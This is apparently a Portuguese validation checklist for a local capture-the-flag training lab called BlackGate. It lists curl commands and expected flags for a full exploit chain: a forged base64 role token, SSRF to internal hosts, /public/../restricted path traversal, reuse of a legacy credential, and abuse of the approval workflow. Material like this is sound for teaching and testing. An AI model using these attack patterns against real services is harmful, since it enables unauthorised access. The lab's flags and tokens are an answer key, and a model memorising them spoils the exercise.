# Validacao - Lab 05 BlackGate - Fase 9

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- servico `blackgate` em execucao;
- porta `8096:3000`.

## Health e recon publico

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- `/health` retorna `1.8.0-phase9`;
- `/api/version` retorna build `bg-phase9-final-approval`;
- client-config nao contem flag, payload ou endpoint interno de approval;
- `/api/routes` nao lista rotas internas de reports, worker ou approval;
- debug nao entrega endpoint final nem combinacao.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fases antigas ainda funcionais

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Arquivos restritos da Fase 9

```bash
FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/final-review-notes.txt"))')
APPROVAL_RECON=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/approval-reconciliation.txt"))')
APPROVAL_POLICY=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/admin-approval-policy.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_NOTES"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_RECON"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_POLICY"
```

Resultado esperado:

- leitura funciona via bypass controlado `/public/../restricted/...`;
- nenhuma resposta contem a flag final.

Path direto deve falhar:

```bash
DIRECT_FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/final-review-notes.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_FINAL_NOTES"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Legacy auth e Fase 6

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Resultado esperado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Criar job da Fase 7

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resultado esperado:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Decoy `migration-check` ainda sem flag:

```bash
CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
```

Esperado: `created: true`, sem flags da Fase 7, 8 ou 9.

## Processar worker da Fase 8

```bash
WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
```

Resultado esperado:

```text
FLAG{blackgate_worker_processing_abuse_phase8}
```

Tambem deve conter:

- `review_id: BG-REV-9041`;
- `trace_marker: qtrace-9041`;
- `queue_ref: maintenance-worker:bg7-job-worker-diagnostics`;
- `approval.state: pending-admin`.

## Approval sem session e session errada

```bash
APPROVAL_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status"))')
APPROVAL_BAD_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bad"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_NO_SESSION"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_BAD_SESSION"
```

Resultado esperado:

- `legacy_session_required`;
- `invalid_legacy_session`.

## Approval status e audit

```bash
APPROVAL_STATUS_GENERIC=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration"))')
APPROVAL_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
APPROVAL_AUDIT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/audit?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS_GENERIC"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_AUDIT"
```

Resultado esperado:

- sem review_id retorna estado generico;
- review correto retorna `pending-admin` e `finalizable: false`;
- audit mostra eventos limitados sem flag final.

## Reconcile decoys

```bash
RECON_MISSING=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
RECON_BAD_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-0000&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
RECON_BAD_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-0000&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
RECON_BAD_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=wrong"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_MISSING"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_TRACE"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_QUEUE"
```

Resultados esperados:

- `reconciliation_incomplete`;
- `review_not_found`;
- `invalid_trace_marker`;
- `invalid_queue_ref`.

## Reconcile correto

```bash
RECONCILE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECONCILE"
```

Resultado esperado:

```text
bg9-reconciled-BG-REV-9041
```

## Finalize decoys

```bash
FINAL_MISSING=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
FINAL_ADMIN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=admin"))')
FINAL_OPERATOR=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=operator"))')
FINAL_BAD_TOKEN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bad&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_MISSING"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_ADMIN"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_OPERATOR"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_BAD_TOKEN"
```

Resultados esperados:

- `finalization_incomplete`;
- `public_admin_rejected`;
- `operator_finalizer_rejected`;
- `invalid_reconciliation_token`.

## Final correto

```bash
FINAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL"
```

Resultado esperado:

```text
FLAG{blackgate_final_admin_approval_boss_chain}
```

Tambem deve retornar:

- `state: finalized`;
- `finalizer: maintenance`;
- `complete: true`.

## Rotas autenticadas no navegador

Apos login, validar:

```text
/dashboard
/context
/gateway
/legacy
/files-vault
/tickets
/assets
/security-policy
/logout
```

## Checks estaticos

```bash
grep -R "809[0-5]" -n . --exclude-dir=node_modules --exclude-dir=.git || true
grep -R "FLAG{blackgate_final_admin_approval_boss_chain}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "BG-REV-9041\\|qtrace-9041\\|bg9-reconciled-BG-REV-9041" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "/approval/finalize\\|/approval/reconcile\\|/approval/status\\|/approval/audit" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "child_process\\|exec(\\|spawn(" -n src || true
```

Resultado esperado:

- nenhuma ocorrencia de porta antiga;
- flag final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- review id, trace marker e token nao aparecem em README, Student Guide, JS publico, views ou rotas publicas;
- endpoints sensiveis de approval nao aparecem nas superficies publicas;
- nenhum uso de command execution real.
